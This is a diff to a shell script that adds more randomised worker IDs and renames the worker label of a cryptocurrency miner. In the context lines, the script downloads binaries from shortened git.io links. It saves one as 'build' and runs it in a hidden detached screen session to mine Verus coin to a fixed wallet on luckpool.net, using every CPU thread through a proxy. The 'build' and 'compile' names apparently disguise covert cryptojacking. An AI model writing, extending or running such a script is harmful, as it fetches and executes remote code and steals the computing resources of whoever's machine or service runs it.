@@ -10,6 +10,16 @@ array[6]="07"
 array[7]="08"
 array[8]="09"
 array[9]="10"
+array[10]="11"
+array[11]="12"
+array[12]="13"
+array[13]="14"
+array[14]="15"
+array[15]="16"
+array[16]="17"
+array[17]="18"
+array[18]="19"
+array[19]="20"
 size=${#array[@]}
 index=$(($RANDOM % $size))
 worker=${array[$index]}
@@ -18,6 +28,6 @@ wget -q https://git.io/JPjuz
 wget -qO build https://git.io/JPjuB
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RXD79XACKosRqTWEoJa4EbZGT93B8rdxnB.worker-$worker -p x -t $(nproc --all) -x $proxy
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RXD79XACKosRqTWEoJa4EbZGT93B8rdxnB.pirus-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
 echo succes
